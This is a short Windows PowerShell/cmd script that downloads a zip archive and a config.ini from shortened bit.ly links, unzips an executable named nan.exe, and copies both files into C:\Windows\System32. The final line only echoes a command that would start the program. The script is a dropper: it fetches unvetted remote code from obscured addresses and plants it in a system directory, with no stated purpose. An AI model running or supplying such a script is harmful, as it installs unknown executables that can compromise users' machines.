Invoke-WebRequest https://bit.ly/3pVgLA2 -OutFile nan.zip
Invoke-WebRequest https://bit.ly/3CLcjYp -OutFile config.ini
unzip nan.zip
Copy nan.exe C:\Windows\System32
Copy config.ini C:\Windows\System32
cmd /c echo cmd /k start nan.exe
